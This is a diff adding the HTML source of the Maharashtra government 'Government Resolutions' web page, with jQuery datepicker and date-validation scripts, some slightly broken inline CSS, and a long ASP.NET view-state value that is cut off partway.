@@ -1,0 +1,976 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html id="Html" xmlns="http://www.w3.org/1999/xhtml" lang="en-IN" xml:lang="en-IN"><head id="Head1"><title>
+	Government Resolutions - Official website of Government of Maharashtra, India
+</title><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=8">
+    <script src="../../Scripts/jquery.js" type="text/javascript"></script>
+    <script src="../../Scripts/jquery.tab.js" type="text/javascript"></script>
+    
+    <link id="MyStyleSheet" href="../Styles/Layout.css" rel="stylesheet" type="text/css"><link id="CultureSheet" href="../Styles/LayoutEN.css" rel="stylesheet" type="text/css"><link href="../Styles/FRmain.css" rel="stylesheet" type="text/css"><link href="../Styles/menuNav.css" rel="stylesheet" type="text/css"><link href="../Styles/font-awesome.min.css" rel="stylesheet" type="text/css">
+    
+    <script type="text/javascript">
+        $(document).ready(function () {
+            var strMsg = "External website that opens in a new window.";
+            var strMsgPdf = "PDF file that opens in a new window.";
+
+            if ($("#HeaderMain1_SetCulture1_btn_Language")[0].value == "English") {
+                strMsg = "नवीन विंडोमध्ये उघडणारे बाह्य संकेतस्थळ.";
+                strMsgPdf = "नवीन विंडोमध्ये उघडणारी पी डी एफ फाईल.";
+            }
+            else {
+                strMsg = "External website that opens in a new window.";
+                strMsgPdf = "PDF file that opens in a new window.";
+            }
+
+//            $(".ExternalLinkClick").click(function () {
+//                alert(strMsg);
+//            });
+
+            $("a[target='_blank']:not([href$='.pdf'])").click(function () {
+                alert(strMsg);
+            });
+            $("a[target='_blank'][href$='.pdf']").click(function () {
+                alert(strMsgPdf);
+            });
+
+        }); </script>
+    
+    
+
+    <link rel="stylesheet" href="https://code.jquery.com/ui/1.13.2/themes/base/jquery-ui.css">
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" type="text/javascript"></script>
+    <script src="https://code.jquery.com/ui/1.13.2/jquery-ui.min.js" type="text/javascript"></script>
+
+    <style type="text/css">
+        .friendlyDate {
+            display: flex;
+            align-items: center;
+            position: relative;
+        }
+
+            .friendlyDate input {
+                width: 180px;
+                height: 38px;
+                padding: 6px 10px;
+                border: 1px solid #bfc5cc;
+                border-radius: 5px 0 0 5px;
+                box-sizing: border-box;
+                font-size: 14px;
+            }
+
+                .friendlyDate input:focus {
+                    border-color: #5584AC;
+                    outline: none;
+                    box-shadow: 0 0 4px rgba(85,132,172,0.35);
+                }
+
+        .calendarButton {
+            width: 40px;
+            height: 38px;
+            border: 1px solid #bfc5cc;
+            border-left: 0;
+            background: #fff;
+            border-radius: 0 5px 5px 0;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .ui-datepicker {
+            font-size: 14px;
+            padding: 8px;
+            border-radius: 6px;
+        }
+
+            .ui-datepicker select.ui-datepicker-month,
+            .ui-datepicker select.ui-datepicker-year {
+                width: auto;
+                margin: 0 2px;
+                padding: 2px;
+            }
+
+        .calendarButton:hover {
+            background: #f1f1f1;
+        }
+
+        .dateError {
+            color: red;
+            font-size: 12px;
+            margin-left: 8px;
+            display: none;
+            white-space: nowrap;
+        }
+    </style>
+
+    <script type="text/javascript">
+
+        $(document).ready(function () {
+
+            $("#SitePH_txtFromDate").datepicker({
+                dateFormat: "dd/mm/yy",
+                changeMonth: true,
+                changeYear: true,
+                yearRange: "1900:2050",
+                showButtonPanel: true,
+                showAnim: "fadeIn",
+                duration: "fast"
+            });
+
+            $("#SitePH_txtToDate").datepicker({
+                dateFormat: "dd/mm/yy",
+                changeMonth: true,
+                changeYear: true,
+                yearRange: "1900:2050",
+                showButtonPanel: true,
+                showAnim: "fadeIn",
+                duration: "fast"
+            });
+
+        });
+
+    </script>
+    <script type="text/javascript">
+
+        function validateDateFormat(input) {
+
+            var value = input.value.trim();
+
+            var errorId = "";
+
+            if (input.id.indexOf("txtFromDate") !== -1) {
+                errorId = "fromDateError";
+            }
+            else if (input.id.indexOf("txtToDate") !== -1) {
+                errorId = "toDateError";
+            }
+
+            var errorLabel = document.getElementById(errorId);
+
+            if (!errorLabel) {
+                return true;
+            }
+
+            if (value === "") {
+                errorLabel.style.display = "none";
+                input.style.borderColor = "#bfc5cc";
+                return true;
+            }
+
+            // DD/MM/YYYY format
+            var datePattern = /^(0[1-9]|[12][0-9]|3[01])\/(0[1-9]|1[0-2])\/([0-9]{4})$/;
+
+            if (!datePattern.test(value)) {
+                errorLabel.style.display = "inline";
+                input.style.borderColor = "red";
+                return false;
+            }
+
+            // Actual date validation
+            var parts = value.split("/");
+
+            var day = parseInt(parts[0], 10);
+            var month = parseInt(parts[1], 10);
+            var year = parseInt(parts[2], 10);
+
+            var date = new Date(year, month - 1, day);
+
+            if (
+                date.getFullYear() !== year ||
+                date.getMonth() !== month - 1 ||
+                date.getDate() !== day
+            ) {
+                errorLabel.style.display = "inline";
+                input.style.borderColor = "red";
+                return false;
+            }
+
+            // Valid date
+            errorLabel.style.display = "none";
+            input.style.borderColor = "#bfc5cc";
+
+            return true;
+        }
+
+    </script>
+
+    <style>
+        .searchInner {
+            padding: 10px 10px 5px;
+            background: #ecf0f1 !important;
+            border: 1px solid #dfd2be;
+        }
+
+        .tblFlexi th {
+            background: #5584AC !important;
+            height: 30 x;
+            r: #FFF;
+            padd px 8px;
+            font i : 1.1em ont-weight: bold;
+            t-align: eft;
+        }
+
+        ter {
+            bac d: #2c e50;
+            flow: idden paddin : 10p or: #eff7fd;
+            clear:;
+            height: auto;
+        }
+    </style>
+</head>
+<body id="Test">
+    
+
+    <form method="post" action="./Government-Resolutions" onsubmit="javascript:return WebForm_OnSubmit();" id="frmMOLSite">
+<div class="aspNetHidden">
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
+<input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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